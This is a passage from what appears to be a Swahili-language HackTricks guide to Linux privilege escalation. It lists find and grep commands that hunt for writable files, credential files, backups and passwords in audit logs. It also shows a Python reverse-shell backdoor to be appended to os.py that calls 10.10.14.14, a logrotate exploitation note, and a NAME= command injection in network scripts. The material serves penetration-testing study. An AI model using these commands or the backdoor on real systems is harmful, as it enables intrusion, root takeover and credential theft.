find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za mwisho
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fail za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Makaratasi ya Nyuma**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fail zilizojulikana zenye nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Chombo kingine cha kuvutia** ambacho unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Magogo

Ikiwa unaweza kusoma magogo, huenda ukapata **habari za kuvutia/za siri ndani yao**. Kadri log inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya "**mbaya**" zilizowekwa vibaya (zilizokuwa na backdoor?) **magogo ya ukaguzi** yanaweza kukuruhusu **kurekodi nywila** ndani ya magogo ya ukaguzi kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma kumbukumbu za log** kundi la [**adm**](interesting-groups-linux-pe/index.html#adm-group) litakuwa na msaada mkubwa.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zinazo na neno "**password**" katika **jina** lake au ndani ya **maudhui**, na pia kuangalia IPs na barua pepe ndani ya logi, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa unavutiwa unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) unafanya.

## Writable files

### Python library hijacking

Ikiwa unajua kutoka **wapi** script ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kubadilisha maktaba za python**, unaweza kubadilisha maktaba ya OS na kuingiza backdoor (ikiwa unaweza kuandika mahali ambapo script ya python itatekelezwa, nakili na ubandike maktaba ya os.py).

Ili **kuingiza backdoor kwenye maktaba** ongeza tu kwenye mwisho wa maktaba ya os.py mistari ifuatayo (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Uthibitisho katika `logrotate` unawaruhusu watumiaji wenye **idhini za kuandika** kwenye faili la log au saraka zake za mzazi kupata haki za juu. Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kudhibitiwa ili kutekeleza faili zisizo za kawaida, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kuangalia idhini si tu katika _/var/log_ bali pia katika saraka yoyote ambapo mzunguko wa log unatumika.

> [!NOTE]
> Uthibitisho huu unahusisha `logrotate` toleo `3.18.0` na la zamani

Taarifa zaidi kuhusu uthibitisho huu inaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia uthibitisho huu kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Uthibitisho huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila wakati unapata kuwa unaweza kubadilisha logs, angalia nani anasimamia hizo logs na angalia kama unaweza kupandisha haki kwa kubadilisha logs kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Marejeleo ya uthibitisho:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script `ifcf-<chochote>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kubadilisha** moja iliyopo, basi **sistimu yako imepata hatari**.

Scripts za mtandao, _ifcg-eth0_ kwa mfano zinatumika kwa muunganisho wa mtandao. Zinatazama kama faili za .INI. Hata hivyo, zinachukuliwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, `NAME=` inayotolewa katika hizi scripts za mtandao haishughulikiwi ipasavyo. Ikiwa una **nafasi nyeupe/boreshaji katika jina, mfumo unajaribu kutekeleza sehemu baada ya nafasi hiyo nyeupe/boreshaji**. Hii ina maana kwamba **kila kitu baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, na rc.d**

Direktori `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa usimamizi wa huduma za Linux wa jadi**. Inajumuisha scripts za `kuanzisha`, `kusitisha`, `kurejesha`, na wakati mwingine `kureload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia viungo vya alama vinavyopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, **usimamizi wa huduma** wa kisasa ulioanzishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mpito kwenda Upstart, scripts za SysVinit bado zinatumika pamoja na usanidi wa Upstart kutokana na safu ya ulinganifu katika Upstart.

**systemd** inajitokeza kama msimamizi wa kisasa wa kuanzisha na huduma, ikitoa vipengele vya juu kama vile kuanzisha daemon kwa mahitaji, usimamizi wa automount, na picha za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa ajili ya pakiti za usambazaji na `/etc/systemd/system/` kwa ajili ya marekebisho ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.

## Njia Nyingine

### NFS Privilege escalation

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoroka kutoka kwa Shells zilizozuiliwa

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada Zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana za Linux/Unix Privesc

### **Zana bora ya kutafuta vektori za kupandisha hadhi za ndani za Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeleo

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
